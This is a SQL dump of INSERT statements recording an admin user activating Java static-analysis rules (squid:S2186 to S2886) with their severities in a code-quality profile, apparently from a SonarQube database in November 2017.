INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2515, '2017-11-20 12:17:05.254', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2186;ruleKey=squid:S2186;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXErmbbGRdfPp-rE3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2516, '2017-11-20 12:17:05.313', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2187;ruleKey=squid:S2187;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEshbbGRdfPp-rE4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2517, '2017-11-20 12:17:05.36', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2188;ruleKey=squid:S2188;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEtQbbGRdfPp-rE5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2518, '2017-11-20 12:17:05.406', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2189;ruleKey=squid:S2189;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEt-bbGRdfPp-rE6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2519, '2017-11-20 12:17:05.443', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2200;ruleKey=squid:S2200;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEujbbGRdfPp-rE7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2520, '2017-11-20 12:17:05.472', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2201;ruleKey=squid:S2201;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEvAbbGRdfPp-rE8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2521, '2017-11-20 12:17:05.523', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2204;ruleKey=squid:S2204;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEvzbbGRdfPp-rE9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2522, '2017-11-20 12:17:05.59', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2209;ruleKey=squid:S2209;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEw2bbGRdfPp-rE-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2523, '2017-11-20 12:17:05.627', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2222;ruleKey=squid:S2222;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXExbbbGRdfPp-rE_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2524, '2017-11-20 12:17:05.668', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2225;ruleKey=squid:S2225;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEyEbbGRdfPp-rFA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2525, '2017-11-20 12:17:05.691', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2226;ruleKey=squid:S2226;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEybbbGRdfPp-rFB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2526, '2017-11-20 12:17:05.714', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2230;ruleKey=squid:S2230;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEyybbGRdfPp-rFC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2527, '2017-11-20 12:17:05.749', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2232;ruleKey=squid:S2232;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEzVbbGRdfPp-rFD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2528, '2017-11-20 12:17:05.786', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2235;ruleKey=squid:S2235;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEz6bbGRdfPp-rFE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2529, '2017-11-20 12:17:05.824', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2236;ruleKey=squid:S2236;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXE0gbbGRdfPp-rFF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2530, '2017-11-20 12:17:05.876', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2251;ruleKey=squid:S2251;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXE1UbbGRdfPp-rFG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2531, '2017-11-20 12:17:05.938', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2252;ruleKey=squid:S2252;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXE2SbbGRdfPp-rFH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2532, '2017-11-20 12:17:05.971', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2254;ruleKey=squid:S2254;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXE2zbbGRdfPp-rFI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2533, '2017-11-20 12:17:06.011', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2259;ruleKey=squid:S2259;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXE3bbbGRdfPp-rFJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2534, '2017-11-20 12:17:06.048', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2272;ruleKey=squid:S2272;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXE4AbbGRdfPp-rFK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2535, '2017-11-20 12:17:06.09', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2273;ruleKey=squid:S2273;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXE4qbbGRdfPp-rFL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2536, '2017-11-20 12:17:06.13', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2274;ruleKey=squid:S2274;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXE5SbbGRdfPp-rFM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2537, '2017-11-20 12:17:06.172', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2275;ruleKey=squid:S2275;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXE58bbGRdfPp-rFN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2538, '2017-11-20 12:17:06.209', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2276;ruleKey=squid:S2276;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXE6hbbGRdfPp-rFO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2539, '2017-11-20 12:17:06.233', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2277;ruleKey=squid:S2277;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXE65bbGRdfPp-rFP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2540, '2017-11-20 12:17:06.254', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2278;ruleKey=squid:S2278;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXE7ObbGRdfPp-rFQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2541, '2017-11-20 12:17:06.28', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2293;ruleKey=squid:S2293;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXE7obbGRdfPp-rFR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2542, '2017-11-20 12:17:06.3', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2326;ruleKey=squid:S2326;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXE78bbGRdfPp-rFS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2543, '2017-11-20 12:17:06.358', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2386;ruleKey=squid:S2386;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXE82bbGRdfPp-rFT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2544, '2017-11-20 12:17:06.429', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2387;ruleKey=squid:S2387;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXE99bbGRdfPp-rFU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2545, '2017-11-20 12:17:06.496', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2388;ruleKey=squid:S2388;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXE_AbbGRdfPp-rFV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2546, '2017-11-20 12:17:06.586', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2390;ruleKey=squid:S2390;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFAabbGRdfPp-rFW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2547, '2017-11-20 12:17:06.652', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2391;ruleKey=squid:S2391;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFBcbbGRdfPp-rFX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2548, '2017-11-20 12:17:06.668', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2437;ruleKey=squid:S2437;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFBsbbGRdfPp-rFY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2549, '2017-11-20 12:17:06.691', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2438;ruleKey=squid:S2438;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFCDbbGRdfPp-rFZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2550, '2017-11-20 12:17:06.715', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2440;ruleKey=squid:S2440;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFCbbbGRdfPp-rFa');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2551, '2017-11-20 12:17:06.739', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2441;ruleKey=squid:S2441;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFCzbbGRdfPp-rFb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2552, '2017-11-20 12:17:06.764', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2442;ruleKey=squid:S2442;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFDMbbGRdfPp-rFc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2553, '2017-11-20 12:17:06.801', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2445;ruleKey=squid:S2445;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFDxbbGRdfPp-rFd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2554, '2017-11-20 12:17:06.825', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2446;ruleKey=squid:S2446;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFEJbbGRdfPp-rFe');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2555, '2017-11-20 12:17:06.851', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2447;ruleKey=squid:S2447;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFEjbbGRdfPp-rFf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2556, '2017-11-20 12:17:06.888', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2583;ruleKey=squid:S2583;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFFIbbGRdfPp-rFg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2557, '2017-11-20 12:17:06.912', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2589;ruleKey=squid:S2589;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFFgbbGRdfPp-rFh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2558, '2017-11-20 12:17:06.944', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2629;ruleKey=squid:S2629;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFGAbbGRdfPp-rFi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2559, '2017-11-20 12:17:06.98', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2637;ruleKey=squid:S2637;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFGkbbGRdfPp-rFj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2560, '2017-11-20 12:17:07.015', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2638;ruleKey=squid:S2638;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFHHbbGRdfPp-rFk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2561, '2017-11-20 12:17:07.043', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2639;ruleKey=squid:S2639;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFHjbbGRdfPp-rFl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2562, '2017-11-20 12:17:07.07', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2653;ruleKey=squid:S2653;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFH-bbGRdfPp-rFm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2563, '2017-11-20 12:17:07.094', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2674;ruleKey=squid:S2674;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFIWbbGRdfPp-rFn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2564, '2017-11-20 12:17:07.119', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2675;ruleKey=squid:S2675;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFIvbbGRdfPp-rFo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2565, '2017-11-20 12:17:07.137', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2676;ruleKey=squid:S2676;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFJBbbGRdfPp-rFp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2566, '2017-11-20 12:17:07.16', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2677;ruleKey=squid:S2677;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFJYbbGRdfPp-rFq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2567, '2017-11-20 12:17:07.181', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2681;ruleKey=squid:S2681;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFJtbbGRdfPp-rFr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2568, '2017-11-20 12:17:07.207', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2692;ruleKey=squid:S2692;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFKHbbGRdfPp-rFs');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2569, '2017-11-20 12:17:07.231', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2695;ruleKey=squid:S2695;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFKfbbGRdfPp-rFt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2570, '2017-11-20 12:17:07.256', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2696;ruleKey=squid:S2696;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFK4bbGRdfPp-rFu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2571, '2017-11-20 12:17:07.281', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2718;ruleKey=squid:S2718;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFLRbbGRdfPp-rFv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2572, '2017-11-20 12:17:07.307', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2737;ruleKey=squid:S2737;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFLrbbGRdfPp-rFw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2573, '2017-11-20 12:17:07.333', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2757;ruleKey=squid:S2757;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFMFbbGRdfPp-rFx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2574, '2017-11-20 12:17:07.425', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2786;ruleKey=squid:S2786;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFNhbbGRdfPp-rFy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2575, '2017-11-20 12:17:07.467', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2789;ruleKey=squid:S2789;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFOLbbGRdfPp-rFz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2576, '2017-11-20 12:17:07.55', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2864;ruleKey=squid:S2864;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFPebbGRdfPp-rF0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2577, '2017-11-20 12:17:07.642', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2885;ruleKey=squid:S2885;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFQ6bbGRdfPp-rF1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2578, '2017-11-20 12:17:07.664', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2886;ruleKey=squid:S2886;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFRQbbGRdfPp-rF2');
